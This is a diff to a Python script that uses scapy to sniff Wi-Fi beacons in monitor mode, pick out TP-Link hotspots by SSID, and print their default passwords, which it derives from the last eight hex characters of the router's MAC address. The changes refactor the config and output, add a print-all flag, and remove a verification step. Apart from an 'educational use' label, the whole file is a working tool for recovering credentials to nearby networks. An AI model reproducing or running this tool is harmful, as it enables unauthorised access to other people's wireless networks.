@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
+from collections import namedtuple
 from argparse import ArgumentParser
 from scapy.sendrecv import sniff
 from scapy.layers.dot11 import Dot11
 
 parser = ArgumentParser(description="Python script for trying default passwords for some TP-Link Hotspots",
                         epilog="FOR EDUCATIONAL USE ONLY")
+parser.add_argument("-p", "--print-all", help="print all found ssid's", action="store_true")
 args = parser.parse_args()
 
-CONFIG = {
-    "verify": False,  # verify if mac_address in ssid
-    "timeout": 10,  # stop sniffing after a given time
-    "print_all": False  # print all found ssid's
-}
+Config = namedtuple("Config", ["timeout", "print_all"])
+CONFIG = Config(timeout=30, print_all=args.print_all)
+
 endpoints = {
     # mac_address: [ssid, password]
 }
@@ -38,8 +38,14 @@ def get_password(mac_address):
     return mac_address.replace(":", "")[-8:]
 
 
-def verify_password(ssid, password):
-    return password[-6:] in ssid
+def add_endpoint(ssid, mac_address, password=None):
+    endpoints[mac_address] = [ssid, password]
+
+
+def print_endpoint(ssid, mac_address, password=None):
+    print(f"\nSSID: {ssid} \nMac Address: {mac_address}")
+    if password:
+        print(f"Default Password: {password}")
 
 
 def packet_handler(packet):
@@ -48,26 +54,23 @@ def packet_handler(packet):
             ssid = packet.info.decode("utf-8")
             mac_address = str(packet.addr2)
             if not endpoints.get(mac_address) and not ssid == "":
-                if CONFIG["print_all"] or is_tp_link(ssid):
-                    print(f"\nSSID: {ssid} \nMac Address: {mac_address}")
+                if CONFIG.print_all:
+                    print_endpoint(ssid, mac_address)
                 if is_tp_link(ssid):
                     password = get_password(mac_address)
-                    valid = verify_password(ssid, password)
-                    print(f"Password: {password}")
-                    if CONFIG["verify"]:
-                        print(f"Validity: {valid}")
-                    endpoints[mac_address] = [ssid, password]
+                    print_endpoint(ssid, mac_address, password=password)
+                    add_endpoint(ssid, mac_address, password=password)
                 else:
-                    endpoints[mac_address] = [ssid, None]
+                    add_endpoint(ssid, mac_address)
         except:
             pass
 
 
 def main():
     try:
-        print("Scanning...")
+        print(f"Scanning for {CONFIG.timeout}sec...")
         sniff(prn=packet_handler, store=False,
-              monitor=True, timeout=CONFIG["timeout"])
+              monitor=True, timeout=CONFIG.timeout)
         print("Finishing up...")
         print(f"Found {len(endpoints)} endpoints")
         print(f"Found {count_passwords()} passwords")
@@ -77,5 +80,5 @@ def main():
         exit(0)
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
